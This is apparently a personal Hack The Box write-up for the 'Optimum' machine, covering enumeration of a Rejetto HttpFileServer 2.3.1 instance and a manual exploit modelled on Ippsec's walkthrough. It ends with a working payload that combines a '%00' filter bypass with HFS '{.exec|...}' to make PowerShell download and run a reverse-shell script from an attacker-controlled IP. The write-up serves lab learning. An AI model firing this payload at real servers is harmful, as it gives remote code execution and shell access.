# <div align="center">Optimum - 21/02/21</div>

> Super easy machine from boot to root with metasploit. 
> So nothing to learn if you follow the ***[Easy way](https://github.com/kelayuu/RoadToPentest/blob/main/Hack%20The%20Box/Devel.md#easy-way)*** from Devel
> But to first get the shell, just check the version on the web page a check it on google what's the man constructor. Then you'll see it's rejetto so use the metasploit rejetto module and just exploit.

--------------------------------------------------------------------

So i've done this box 100% with metasploit so not much fun :( 
But still try to enumerate for priv-esc but didn' get anything with Juicy-potato or GPP Password abuse ... So i finnished with Metasploit, ezpz but not improvement  

--------------------------------------------------------------------
For the following part it's not my way and i just write the way i've seen from the best of the best -> [Ippsec](https://www.youtube.com/watch?v=kWTnVBIpNsE) but so much things to learn !

## 1. Mapping :

Only HTTP port open after all port enumeration ...
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Optimum/optimum-nmap.png)

So let's take a look further !
## 2. Scooting :
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Optimum/optimum-http-page.png)

We can see the page is running with [HttpFileServer](http://www.rejetto.com/hfs/) version 2.3.1 so let's try to search if there is any exploit for this version 
![](https://raw.githubusercontent.com/kelayuu/RoadToPentest/main/0-images/HTB%20-%20Optimum/optimum-google-search.png)

So 2 exploits from exploitDB wich didn't worked for me but i should try harder this. And [the other](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/) on is from rapid7 with a description part 

>Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.

We learn 2 things here. First is HFS is using so scripting, and the second is that you can bypass the filter with adding '%00'.
So let's copypast 'HFS scripting' on google and open the [first link](https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands)
- We can see it uses {} and | and = and / and .
As we can see methods are call by using '.'
So ctrl+f for '.exec' as we can guess and we see 
>{.exec|notepad.}

Now we got our bypass filter and execution command !
So let's put this into burp

```shell
%00{.exec|c:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.18:8000/Invoke-PowerShellTcp.ps1').}
```

![[optimum-burp-shell.png]]
![[optimum-netcat-getshell.png]]